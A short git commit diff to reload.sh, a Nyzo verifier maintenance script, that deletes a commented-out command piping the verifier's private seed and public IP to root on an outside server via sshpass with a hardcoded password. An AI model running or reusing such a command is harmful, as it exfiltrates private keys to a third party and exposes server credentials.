d4b1c5f0cea1012451bdfb2997cfc23890f29f8f
junscapital <52300722+junscapital@users.noreply.github.com>
2020-07-15 00:08:24 +0800

    Update reload.sh

--- reload.sh
+++ reload.sh
@@ -1,6 +1,4 @@
 #!/bin/bash
-#sudo su
-#echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'OwRXBiZ0' ssh root@51.75.249.70 'cat - >> /root/managed_verifiers'
 sudo supervisorctl reload
 sleep 3s
 sudo renice -n -5 -p $(pgrep ^java$)
